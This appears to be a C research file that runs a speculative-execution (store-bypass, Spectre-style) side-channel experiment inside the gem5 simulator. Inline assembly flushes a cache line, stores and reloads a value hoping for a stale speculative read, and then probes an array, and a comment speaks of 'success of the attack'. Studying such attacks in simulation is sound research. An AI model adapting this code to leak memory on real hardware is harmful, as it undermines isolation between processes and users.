#include<stdio.h>
#include<stdlib.h>
#include"/home/tarun-d/Desktop/gem5/include/gem5/m5ops.h"
#include<inttypes.h>
#include<x86intrin.h>


char ch = 0x1;
double q = 0;
char array[256 * 4 * 1024];
int x;

char K[8196];
char M[8196];
char *X;
char y;

int main(){    

    int i;

    m5_global_init();
    _mm_lfence();
    _mm_mfence();

    for(i=0;i<=1023;i++)
        K[i] = 0x1;
    
    X = K;

    for(i=0;i<=1023;i++)
        M[i] = 0x5;

    X = M;
    y = *X;

    _mm_lfence();
    _mm_mfence();
    m5_global_init();


    // char *array_ptr = array;
    // array[0] = 2;

    // q = ch;



    // _mm_clflush(array);

    // printf(ch); 

    // q = q + 1;
    


    // __asm__(  
    //     "mov al, 0x1"
    //     "mov [rdi + rcx], al"
    //     "movzx r8, BYTE PTR [rsi + rcx]"
    // );

    // "movq $array, %rdi;"

    // m5_global_init();
    _mm_lfence();
    _mm_mfence();

    __asm__ (   
                
                "lea 0x2bb82c(%rip),%rax;"        // Places the base address of array in rax.
                "mov %rax, %rcx;"
                "xor %rbx, %rbx;"                 // To clear rbx register.
                "mov (%rax), %r9;"                // To pre-load the value in Load Buffer
                "clflush (%rax);"                  //  clflush the array address
                "mov %rcx, %rax;"
                "mov $0x5, %r8;"

                "movq %r8, (%rax);"                // A memory write which will be placed in the store buffer. 
                                                  // You need to reaccess this and get the stale value instead, due to the speculative execution.
                "mov (%rax), %ebx;"
                "imul $64, %ebx, %ebx;"
                
                "add %rbx, %rcx;"
                "mov (%rcx), %dl;"                  // This request to memory must be from 0x6bc3c0 (for success of the attack)                       
    );
                
    _mm_lfence();
    _mm_mfence();
    // m5_global_init();

    printf("array[] = %d \n", array[0]);

}